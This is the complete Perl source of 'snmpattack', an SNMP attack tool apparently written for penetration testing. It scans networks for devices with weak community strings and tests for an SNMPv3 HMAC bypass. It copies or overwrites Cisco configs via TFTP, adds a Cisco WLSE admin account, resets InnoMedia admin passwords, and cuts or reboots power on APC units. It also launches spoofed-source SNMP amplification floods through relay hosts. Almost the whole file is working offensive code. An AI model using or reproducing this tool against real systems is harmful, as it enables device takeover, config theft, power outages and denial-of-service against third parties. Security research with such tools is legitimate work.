#!/usr/bin/perl -w

#		Copyright 2007 Daniel Mende <dmende@ernw.de>

#       Redistribution and use in source and binary forms, with or without
#       modification, are permitted provided that the following conditions are
#       met:
#       
#       * Redistributions of source code must retain the above copyright
#         notice, this list of conditions and the following disclaimer.
#       * Redistributions in binary form must reproduce the above
#         copyright notice, this list of conditions and the following disclaimer
#         in the documentation and/or other materials provided with the
#         distribution.
#       * Neither the name of the  nor the names of its
#         contributors may be used to endorse or promote products derived from
#         this software without specific prior written permission.
#       
#       THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
#       "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
#       LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
#       A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
#       OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
#       SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
#       LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
#       DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
#       THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
#       (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
#       OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

# 2011.02.28	Daniel Mende	dmende@ernw.de
#		added cisco config upload

# 2010.02.04	Daniel Mende	dmende@ernw.de
#		added cisco wlse attack

# 2009.11.16	Daniel Mende	dmende@ernw.de
#		added check for broken HMAC auth (patched net-snmp needed)

# 2008.09.16    Daniel Mende    dmende@ernw.de
#       fixed broken attacks and flooding

# 2008.02.03	Daniel Mende	dmende@ernw.de
#       added ip parsing from file

# 2007.11.09	Daniel Mende	dmende@ernw.de
#       parallized scanning

# 2007.08.23	Daniel Mende	dmende@ernw.de
#       parallized flooding

# 2007.04.23	Daniel Mende    dmende@ernw.de
#       added attack-mode

# 2007.03.05	Daniel Mende    dmende@ernw.de
#       initial version

# If U get something like
#
# 'thread failed to start: sendto() at /usr/[...]/Net/RawIP.pm line [...]'
#
# be shure u´re NOT sending to your lokal Net-Address or Broadcast-Address
# your kernel won´t allow that !!!

# use strictness
use strict;

# print non-fatal warnings
use warnings;

# use Sockets for basic net things
use Socket;

# use Net::IP for address processing
use Net::IP;

use vars qw/ %args /;

use threads;
use threads::shared;

use Net::SNMP;

# declare variables
my $version = "1.8";

my $ips;
my $pinger;
my $ping_timeout = 1;	# seconds
my $ping_port = 80;
my @communities = qw (public private);
my $community;
my $delimiter;
my @usernames;
my $hmac_tries = 1000;

my $snmp_version = '2c';
my $snmp_port = 161;
my $snmp_retries = 0;
my $snmp_timeout = 1;

my $snmp_rw_test = "0x31337";
my $test_rw = 0;
my $scan_type = "snmp";
my $scan_threads_count = 10;

my $spoof_enabled : shared = 1;
$spoof_enabled = 0;
my @spoof_threads;

my $attack_mode = 0;
my $target;
my $flood : shared = 1;
$flood = 0;
my $flood_enabled : shared = 1;
$flood_enabled = 0;
my $flood_all = 0;
# maybe you want to tune this
my $flood_sleep = 9000;    #useconds
my @flood_threads;

my @relay_hosts : shared = 1;
@relay_hosts = qw ();
my @relay_comms : shared = 1;
@relay_comms = qw ();
my @relay_rw : shared = 1;
@relay_rw = qw ();

# decleare tftp server
my $tftpServerAddress;

# declare hosts-array
my @hosts;

# declare OIDs
my $mibDescr = "1.3.6.1.2.1.1.1.0";	# System description
my $mibContact = "1.3.6.1.2.1.1.4.0";	# System Contact
my $mibName = "1.3.6.1.2.1.1.5.0";	# System Name
my $mibLocation = "1.3.6.1.2.1.1.6.0";	# System Location
my $hmacOIDtotest = $mibDescr;	# The OID to use for testing the HMAC Bug

# InnoMedia PWD set
my $mibInnoMediaUser = "1.3.6.1.4.1.3354.1.3.1.1.3.1.0";	# The username fo admin account
my $mibInnoMediaPwd = "1.3.6.1.4.1.3354.1.3.1.1.3.2.0";		# The password of admin account
my $pwdInnoMedia = "admin";

# cisco conf copy
my $mibCiscoCopyProto = "1.3.6.1.4.1.9.9.96.1.1.1.1.2";		# Protokoll used to copy
my $mibCiscoCopySrcFileType = "1.3.6.1.4.1.9.9.96.1.1.1.1.3";	# The file Type to copy
my $mibCiscoCopyDstFileType = "1.3.6.1.4.1.9.9.96.1.1.1.1.4";	# The file Type to write
my $mibCiscoCopyAddress = "1.3.6.1.4.1.9.9.96.1.1.1.1.5";	# Address where to copy
my $mibCiscoCopyName = "1.3.6.1.4.1.9.9.96.1.1.1.1.6";		# Name of copied file
my $mibCiscoCopyStatus = "1.3.6.1.4.1.9.9.96.1.1.1.1.14";	# Staus of copy process
my $uniqueCiscoId = "111";

# cisco wlse
my $mibBsnLocalManagementUserName = "1.3.6.1.4.1.14179.2.5.11.1.1";
my $mibBsnLocalManagementUserPassword = "1.3.6.1.4.1.14179.2.5.11.1.2";
my $mibBsnLocalManagementUserAccessMode = "1.3.6.1.4.1.14179.2.5.11.1.3";
my $mibBsnLocalManagementUserRowStatus = "1.3.6.1.4.1.14179.2.5.11.1.23";
my $pwdCiscoWlse = "cisco";
my $usrCiscoWlse;
my $mibAgentSnmpCommunityConfigTable = "1.3.6.1.4.1.14179.1.2.5.5.1";

# APC
my $mibAPCMasterControlSwitch = "1.3.6.1.4.1.318.1.1.4.2.1.0";	# PDUMasterControlSwitch
my $apc_mode;

# long (255 chars) string to optimize flooding trafic
my $longstring = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

use constant MAX_RECV_LEN => 1500;

sub init {
	use Getopt::Std;
	getopts('A:c:C:D:f:FhH:Il:M:p:rs:t:vwW:', \%args);
	usage() if $args{h};
	$ips = $ARGV[0];
	$test_rw = 1 if $args{r};
	$tftpServerAddress = $args{C} if $args{C};
	$tftpServerAddress = $args{D} if $args{D};
	$ping_port = $args{p} if $args{p};
	$scan_type = $args{s} if $args{s};
	$scan_threads_count = $args{t} if $args{t};
	$flood_all = 1 if $args{F};
	
	if ($args{l}) {
		$delimiter = $args{l};
		die "File $ips didnt exist\n" unless (-e $ips);
		die "Cant read file $ips\n" unless (-r $ips);
	}

	if ($args{c}) {
		if ($args{c} =~ ",") {
			my @tmp = split(/,/, $args{c});
			foreach (@tmp) { push @communities, $_; }
		} else { push @communities, $args{c}; }
	}

	if ($args{f}) {
		$target = $args{f};
		$attack_mode = 1;
		$test_rw = 1;
	}

	if ($args{H}) {
		if ($args{H} =~ ",") {
			my @tmp = split(/,/, $args{H});
			foreach (@tmp) { push @usernames, $_; }
		} else { push @usernames, $args{H}; }
	}

	if ($args{M}) {
		$hmacOIDtotest = $args{M};
	}

	if ($args{s}) {
		die "Unsupported scanning type\n" unless ($scan_type =~ "icmp|snmp|syn");
		print "Port is only used with syn scanning, irgnoring argument '-p $args{p}'\n" if ($args{p} && $scan_type !~ "syn");
	}
    
	if ($args{A}) {
		die "Unsupported APC attack type\n" unless ($args{A} =~ "1|3|4");
		$apc_mode = $args{A};
	}

	if ($args{W}) {
		$usrCiscoWlse = $args{W};
	}

	die "Specify at least one target! Use -h for usage\n" unless ($ips);
	
	print "snmpattack v" . $version . ' by Daniel Mende - dmende@ernw.de' . "\n";
	
	if ($args{v}) {
		print "Running APC attacks, type $args{A}\n" if $args{A};
		print "Using communities public,private,$args{c}\n" if $args{c};
		print "Testing for HMAC bug with user(s): $args{H}\n" if $args{H};
		print "Running Cisco config DL with tftp $tftpServerAddress\n" if $args{C};
		print "Running Cisco config UL with tftp $tftpServerAddress\n" if $args{D};
		print "Running InnoMedia Attacks\n" if $args{I};
		print "Scanning the given range with scan type $scan_type\n";
		print "Using Syn scan on port $ping_port\n" if ($scan_type =~ "syn");
		print "Checking for RO/RW\n" if $args{r};
		print "Scanning the range with $scan_threads_count threads\n" if $args{t};
		print "Scanning for WLSE mibs\n" if $args{w};
		print "Adding Cisco WLSE user $usrCiscoWlse\n" if $args{W};
		print "The given ip/range is $ips\n";
		print "The OID to use for testing the HMAC bug is $hmacOIDtotest\n" if $args{H};
	    print "=== Running in attack mode againt $target ===\n" if $args{f};
	}
    
    #turn of output buffering (for cooler loocking wheel ;)
    $| = 1;
}

sub usage {
	print STDERR << "EOF";

usage: $0 [-FhIlrv] [-A type] [-c comm1,comm2] [-C tftp] [-f target] [-H user1,user2] [-s type] [-l delimiter] [-M OID] {ip/range | input file}

-A type		: Do APC specific attacks (type: 1 = allON, 3 = allOFF, 4 = allREBOOT)
-c comm		: Add communities to check for (comma separated)
-C tftp		: Download Cisco config and specify the tftp server to use
-D tftp		: Upload Cisco config and specify the tftp server to use
-f target	: Switch to flood-mode
-F		: Don't ask for involving flood-hosts. Start them all.
-h		: Print this help
-H user[s]	: Check for HMAC bug in snmpv3 with given user name[s]
-I		: Do InnoMedia specific attacks
-l		: Parse IPs from file, seperatet with the given delimiter
-M		: Use this OID to test for HMAC bug in SNMPv3
-p port		: The port for tcp syn scan (default = 80)
-r		: Test for RO / RW community
-s type		: Scans the given ip/range (type: snmp, icmp, syn | default = snmp)
-t num		: Count of parallel scans (default = 10)
-v		: Be verbose
-w		: Scan for WLSE mibs
-W user		: Add user to cisco WLSE

scan and attack all found devices: 
# $0 -I 10.0.0.0/24

scan and use all founds as relay hosts: 
# $0 -s syn -p 21 -v -f 1.2.3.4 10.0.0.0/24

EOF

	exit;
}

sub spoof_ip {
	my $mode = shift;
	my $recvaddr = shift;
	my $recvport = shift;
	my $spoof_ip_from = shift;
	my $spoof_ip_to = shift;
	my $spoof_port_from = shift;
	use Net::RawIP;
	use Time::HiRes;
	use Fcntl;
	my $in;
	my $read;
	my $recv = '';
	my $recvsock = socket(RECV, AF_INET, SOCK_DGRAM, getprotobyname('udp')) or die "socket: $!";
	setsockopt(RECV, SOL_SOCKET, SO_REUSEADDR, 1) or die "setsock: $!";
	fcntl(RECV, F_SETFL, O_NONBLOCK) or die "fcntl: $!";
	bind(RECV, sockaddr_in($recvport, $recvaddr));
	vec($recv, fileno(RECV), 1) = 1;
	my $rawsock = new Net::RawIP({udp => {}});

	print "starting spoof thread...\n" if $args{v};

	do {
		$read = select($recv, undef, undef, 1);
		if($read) {
			recv(RECV, $in, MAX_RECV_LEN, 0);
			$rawsock->set( {
					ip => {		saddr => $spoof_ip_from,
								daddr => $spoof_ip_to
					},
					udp => {	source => $spoof_port_from,
								dest => $snmp_port,
								data => $in
						}
					} );
			if ($mode =~ 'flood') {
				$flood = 0;
				while($flood_enabled) {
					$rawsock->send;
					Time::HiRes::usleep($flood_sleep);
				}
			} else {
				$rawsock->send;
			}
		}
	} while($spoof_enabled);
}

sub mib_encode_username {
	my @array = unpack("C*", shift);
	my $ret = "";
	foreach(@array) {
		$ret .= ".".$_;
	}
	return $ret;
}

sub attack_wlse {
	my $session = shift;
	# try to add local admin user
	return $session->set_request( -varbindlist => [
		( $mibBsnLocalManagementUserPassword.".4".mib_encode_username($usrCiscoWlse), OCTET_STRING, $pwdCiscoWlse ),
		( $mibBsnLocalManagementUserAccessMode.".4".mib_encode_username($usrCiscoWlse), INTEGER, 2 ),
		( $mibBsnLocalManagementUserRowStatus.".4".mib_encode_username($usrCiscoWlse), INTEGER, 4) ] );
}

sub scan_wlse {
	my $session = shift;
	# read config table
	my $result = $session->get_table( -baseoid => $mibAgentSnmpCommunityConfigTable );
	my @oids;
	if (defined($result)) {
		for my $key ( keys %{$result} ) {
			push(@oids, $key);
		}
		@oids = sort { (split(/\./, $::a))[13] cmp (split(/\./, $::b))[13] } @oids;
		my @comm;
		my @ip;
		my @net;
		my @rw;
		foreach(@oids) {
			my $key = substr($_, length($mibAgentSnmpCommunityConfigTable) + 1);
			$key = substr($key, 0, index($key, "."));
			if ($key == 1) { push(@comm, $$result{$_}); }
			if ($key == 2) { push(@ip, $$result{$_}); }
			if ($key == 3) { push(@net, $$result{$_}); }
			if ($key == 4) { push(@rw, $$result{$_}); }
		}
		while (defined(my $comm = pop(@comm))) {
			my $out = "Found community '$comm', accessable from ".pop(@ip)."/".pop(@net);
			if (pop(@rw) =~ "2") {
				$out .= " RW\n" ;
			} else {
				$out .= " RO\n";
			}
			print $out;
		}
	}
}

sub attack_cisco_dl {
	my $session = shift;
	my $host = shift;
	# try to copy cisco config
	$uniqueCiscoId += 1;
	return	$session->set_request( -varbindlist => [
		( $mibCiscoCopyProto.".".$uniqueCiscoId, INTEGER, 1 ),
		( $mibCiscoCopySrcFileType.".".$uniqueCiscoId, INTEGER, 4 ),
		( $mibCiscoCopyDstFileType.".".$uniqueCiscoId, INTEGER, 1 ),
		( $mibCiscoCopyAddress.".".$uniqueCiscoId, IPADDRESS, $tftpServerAddress ),
		( $mibCiscoCopyName.".".$uniqueCiscoId, OCTET_STRING, $host."-config" ),
		( $mibCiscoCopyStatus.".".$uniqueCiscoId, INTEGER, 4 ) ] );
}

sub attack_cisco_ul {
	my $session = shift;
	my $host = shift;
	# try to upload cisco config
	$uniqueCiscoId += 1;
	return	$session->set_request( -varbindlist => [
		( $mibCiscoCopyProto.".".$uniqueCiscoId, INTEGER, 1 ),
		( $mibCiscoCopySrcFileType.".".$uniqueCiscoId, INTEGER, 1 ),
		( $mibCiscoCopyDstFileType.".".$uniqueCiscoId, INTEGER, 4 ),
		( $mibCiscoCopyAddress.".".$uniqueCiscoId, IPADDRESS, $tftpServerAddress ),
		( $mibCiscoCopyName.".".$uniqueCiscoId, OCTET_STRING, $host."-config" ),
		( $mibCiscoCopyStatus.".".$uniqueCiscoId, INTEGER, 4 ) ] );
}

sub attack_inno {
	my $session = shift;
	# try to get InnoMedia user and set PWD
	my $result = $session->get_request( -varbindlist => [$mibInnoMediaUser] );
	if(defined($result))  {
		$result = $result->{$mibDescr};
		printf(" InnoMedia admin user $result\n");
		$result = $session->set_request( -varbindlist => [ ( $mibInnoMediaPwd, OCTET_STRING, $pwdInnoMedia ) ] );
	}
}

sub attack_apc {
	my $session = shift;
	# Attack APC
	return $session->set_request( -varbindlist => [ ($mibAPCMasterControlSwitch, INTEGER, $apc_mode) ] );
}

sub test_rw {
	my $session = shift;
	my $error;
	my $result;
	my $contact;
	$result = $session->get_request( -varbindlist => [$mibContact] );
	$contact = $result->{$mibContact};
	$result = $session->set_request( -varbindlist => [ ( $mibContact , OCTET_STRING, $snmp_rw_test ) ] );
	$result = $session->get_request( -varbindlist => [$mibContact] );
	if ($result->{$mibContact} =~ $snmp_rw_test) {
		$result = $session->set_request( -varbindlist => [ ( $mibContact , OCTET_STRING, $contact ) ] );
		return 1;
	} else { return 0; }
}

sub test_hmac {
	my $host = shift;
	my $user = shift;
	my $ret = undef;
	my $onetime = 0;
	my @command = ("EXP=66 snmpget", "-v", "3", "-u", $user, "-l", "authNoPriv", "-a", "MD5", "-A", "aaaaaaaaaaaa", $host, $hmacOIDtotest, "-Lo");
	for(my $i = 1; $i <= $hmac_tries; $i++) {
		$ret = `@command`;
                if ($? == 0) {
                        print "HMAC bug found with username $user.\n"; # if ($args{v});
			print "Net-SNMP Output:\n";
			print "$ret";
                        return defined;
                }   
		if ($ret =~ "incorrect password") {
			if ($onetime == 0) {
				$onetime = 1;
				print "At least the username is correct: \n";
				print "Username: $user \n";
				print "IP: $host \n";
			}
		}
		if ($ret =~ "Unknown user name") {
			print "HMAC: unknown user name $user for $host\n" if ($args{v});
			return undef;
		}
		if ($ret =~ "Timeout") {
			print "HMAC: timeout on $host\n" if ($args{v});
			return undef;
		}
	}
	return undef;
}

sub icmp_scan {
	my $host = shift;
	use Net::Ping;
	my $ret = undef;
	$pinger = new Net::Ping->new("icmp");
	if ($pinger->ping($host,$ping_timeout)) {
		print "Host $host is up.\n" if ($args{v});
		$ret = defined;
	}
	$pinger->close;
	return $ret;
}

sub syn_scan {
	my $host = shift;
	use Net::Ping;
	my $rtt;
	my $ip;
	my $ret = undef;
	$pinger = Net::Ping->new("syn");
	$pinger->{port_num} = $ping_port;
	$pinger->ping($host);
	while (($host,$rtt,$ip) = $pinger->ack) {
		print "Host $host [$ip] ACKed in $rtt seconds.\n" if ($args{v});
		$ret = defined;
	}
	$pinger->close;
	return $ret;
}

sub flood {
	my $host = shift;
	my $port = shift;
	my $comm = shift;
	my $rw = shift;
	#flooding
	my $session;
	my $error;
	my $result;
	my @read;

	if ($rw) {
		print "got write access, rewriting sysvars to long strings.\n" if ($args{v});
		( $session, $error ) = Net::SNMP->session(
					-hostname => $host,
					-community => $comm,
					-version => '1',
					-retries => $snmp_retries,
					-timeout => $snmp_timeout
					);
		die "ERROR: $error\n" unless defined($session);
		
		push @read, $session->get_request( -varbindlist => [$mibContact] );
		$session->set_request( -varbindlist => [ ( $mibContact, OCTET_STRING, $longstring ) ] );
		push @read, $session->get_request( -varbindlist => [$mibDescr] );
		$session->set_request( -varbindlist => [ ( $mibDescr, OCTET_STRING, $longstring ) ] );
		push @read, $session->get_request( -varbindlist => [$mibName] );
		$session->set_request( -varbindlist => [ ( $mibName, OCTET_STRING, $longstring ) ] );
		push @read, $session->get_request( -varbindlist => [$mibLocation] );
		$session->set_request( -varbindlist => [ ( $mibLocation, OCTET_STRING, $longstring ) ] );
		$session->close;
	}
		
	# open session
	( $session, $error ) = Net::SNMP->session(
				-hostname => "127.0.0.1",
				-port => $port,
				-community => $comm,
				-version => '1',
				-retries => $snmp_retries,
				-timeout => $snmp_timeout
				);
	die "ERROR: $error\n" unless defined($session);
	
	print "generating request packet...\n" if ($args{v});
	$result = $session->get_request(	#-nonrepeaters => 0,
					#-maxrepetitions  => 10,
					-varbindlist => [$mibContact, $mibDescr, $mibName, $mibLocation] );

	do {
		sleep(1);
	} while($flood_enabled);	
	$session->close;

	if ($rw) {
		print "rewriting sysvars to original strings.\n" if ($args{v});
		( $session, $error ) = Net::SNMP->session(
					-hostname => $host,
					-community => $comm,
					-version => '1',
					-retries => $snmp_retries,
					-timeout => $snmp_timeout
					);
		die "ERROR: $error\n" unless defined($session);
		
		$session->set_request( -varbindlist => [ ( $mibLocation, OCTET_STRING, pop @read ) ] );
		$session->set_request( -varbindlist => [ ( $mibName, OCTET_STRING, pop @read ) ] );
		$session->set_request( -varbindlist => [ ( $mibDescr, OCTET_STRING, pop @read ) ] );
		$session->set_request( -varbindlist => [ ( $mibContact, OCTET_STRING, pop @read ) ] );
		$session->close;
	}
}

sub scan {
	my $host = shift;
	my $session;
	my $error;
	my $result;
	my $comm;
	my $user;
	my $out;

	if ($scan_type =~ "syn") {
		return unless defined(syn_scan($host));
	} elsif ($scan_type =~ "icmp") {
		return unless defined(icmp_scan($host));
	}
	if ($args{H}) {
		foreach $user (@usernames) {
			 last if (defined(test_hmac($host, $user)));
		}
	}

	foreach $comm (@communities) {
		( $session, $error ) = Net::SNMP->session(
					-hostname => $host,
					-community => $comm,
					-version => $snmp_version,
					-retries => $snmp_retries,
					-timeout => $snmp_timeout
					);
		die "ERROR: $error\n" unless defined($session);
		$result = $session->get_request( -varbindlist => [$mibDescr] );
		if (defined($result)) {
			$out = "\nHost $host up >>> $comm <<< $result->{$mibDescr}";
			if ($attack_mode) {
				push @relay_hosts, $host;
				push @relay_comms, $comm;
			}
			if ($test_rw) {
				if (test_rw($session)) {
					$out .= " => RW";
					push @relay_rw, 1 if ($attack_mode);
				} else {
					$out .= " => RO";
					push @relay_rw, 0 if ($attack_mode);
				}
			} else {
				push @relay_rw, 0 if ($attack_mode);
			}
            $out .= "\n";
			print $out;
			scan_wlse($session) if($args{w});
			attack_wlse($session) if($args{W});
			attack_cisco_dl($session, $host) if($args{C});
			attack_cisco_ul($session, $host) if($args{D});
			attack_inno($session) if($args{I});
			attack_apc($session) if($args{A});
		} else {
			print "." if ($args{v});
		}
		$session->close();
	}
}

my $flip = "|";
sub wheel {
	print $flip = { reverse split //, '|/\|-\/-|', -1 }->{ $flip }, "\b";
}

init();

my @list;
if (defined $delimiter) {
	open(IN, "<$ips");
	my @lines = <IN>;
	my $line;
	foreach $line (@lines) {
		my @ip = split(/$delimiter/, $line);
		my $cur;
		foreach $cur (@ip) {
			@list = threads->list();
			if(@list >= $scan_threads_count) {
				$list[0]->join;
			}
			&wheel;
			threads->new(\&scan, $cur);
		}
	}
	close(IN);	
} else {
	my $ip = new Net::IP("$ips");
	do {
		@list = threads->list();
		if(@list >= $scan_threads_count) {
			$list[0]->join;
		}
		&wheel;
		threads->new(\&scan, $ip->ip());
	} while (++$ip);
}
do {
	@list = threads->list();
	$list[0]->join;
} while (@list > 1);

print "\n";

if ($attack_mode) {
	my $session;
	my $error;
	my $result;
    my $host;
	my $run = 1;
	my $recvport = 2345;
	my $in = '';
	$spoof_enabled = 1;
	$flood_enabled = 1;

	foreach $host (@relay_hosts) {
	    my $comm = pop @relay_comms;
	    my $rw = pop @relay_rw;
		push @spoof_threads, threads->new(\&spoof_ip, 'flood', 127.0.0.1, $recvport, $target, $host, 31337);
		push @flood_threads, threads->new(\&flood, $host, $recvport, $comm, $rw);
		$recvport += 1;
		
		print "flooding $target from $host.\n";
        if (!$flood_all) {
            if ($in !~ "a") {
                print "enter 'q' to quit,'n' to start next host.\n";
                do {
                    $in = <STDIN>;
                    $run = 0 if ($in =~ "q");
                } while ($in !~ "n" && $run);
            }
            last unless($run);
        }
	}
	if ($run) {
		print "flooding with all discovered hosts startet.\nenter 'q' to quit.\n";
		do {
			$in = <STDIN>;
			$run = 0 if ($in =~ "q");
		} while ($run);
	}
}

# close objects
if ($flood_enabled) {
	$flood_enabled = 0;
	foreach (@flood_threads) {
		$_->join;
	}
	print "flood threads terminated...\n" if $args{v};
}
if ($spoof_enabled) {
	$spoof_enabled = 0;
	foreach (@spoof_threads) {
		$_->join;
	}
	print "spoof threads terminated...\n" if $args{v};
}

print "done\n" if $args{v};
